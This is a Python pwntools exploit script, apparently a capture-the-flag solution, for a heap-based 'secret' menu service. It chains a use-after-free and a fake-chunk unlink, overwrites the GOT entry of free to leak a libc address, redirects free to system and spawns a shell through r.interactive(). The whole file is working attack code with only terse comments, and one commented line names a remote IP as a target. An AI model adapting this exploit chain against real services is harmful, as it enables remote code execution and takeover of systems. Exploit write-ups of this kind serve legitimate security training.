#!/usr/bin/env python

from pwn import *

r = remote('127.0.0.1', 4000)
#r = remote('52.68.31.117', 5566)


secret_size={'small':'1', 'big':'2', 'huge':'3'}
free_got = 0x602018
puts_got_value = 0x4006c6
libc_start_main_got = 0x602048


def keep(size, content):
    r.sendlineafter("3. Renew secret\n", '1')
    r.sendlineafter("3. Huge secret\n", secret_size[size])
    r.sendlineafter("Tell me your secret:", content)

def wipe(size):
    r.sendlineafter("3. Renew secret\n", '2')
    r.sendlineafter("3. Huge secret\n", secret_size[size])

def renew(size, content):
    r.sendlineafter("3. Renew secret\n", '3')
    r.sendlineafter("3. Huge secret\n", secret_size[size])
    r.sendlineafter("Tell me your secret:", content)


keep('huge', 'A'*8)
wipe('huge')
keep('small', 'B'*8)
wipe('small')
keep('huge', 'C'*8) # now buf_huge and buf_small point to the same adr
wipe('small') # free the huge by use buf_small

keep('small', 'D'*8)
keep('big', 'E'*8) # now we can use renew() huge overflow 

fake_fd = 0x6020a8-0x18 # FD
fake_bk = 0x6020a8-0x10 # BK

# overflow big to fake chunk info make it fastbin
payload = ""
payload += p64(0x0) + p64(0x21)  # fake prev_chunk header
payload += p64(fake_fd) + p64(fake_bk) 
payload += p64(0x20) # fake big chunk's prev_size
payload += p64(0xfb0) # fake big chunk size
payload += 'B'*0x80
renew('huge', payload)

wipe('big')

payload = ""
payload += 'A'*0x10 + p64(0)
payload += p64(0x6020b0) # make buf_huge points to buf_small
payload += p64(free_got) # buf_small points to GOT of free
renew('huge', payload)

renew('small', p64(puts_got_value)*2) # after this free(buf) ==> puts(buf) *2 so that puts won't break

# make buf_small points to libc_start_main_got
# wipe(small) -> free(small) -> puts(small) -> puts(libc_start_main)
renew('huge', p64(libc_start_main_got) + p32(1)*3) # p32(1) for inuse variable of those small big huge secret since renew() will check it
wipe('small')
x = r.recvline(1)
print repr(x)

#libc = ELF('/root/glibc-2.19/64/lib/libc.so.6')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
#libc = ELF('libc.so.6')
base = u64(x[:6].ljust(8,'\x00')) - libc.symbols['__libc_start_main']
print hex(base)
system = base + libc.symbols['system']

renew('huge', p64(free_got) + p32(1)*3) # make buf_small points to GOT of free
renew('small', p64(system) + p64(puts_got_value)) # GOT hijack free to system

renew('huge', p64(0x6020b8)+'sh\x00')
wipe('small') # wipe(small) -> free(small) -> system(small) -> system('sh')

r.interactive()
    
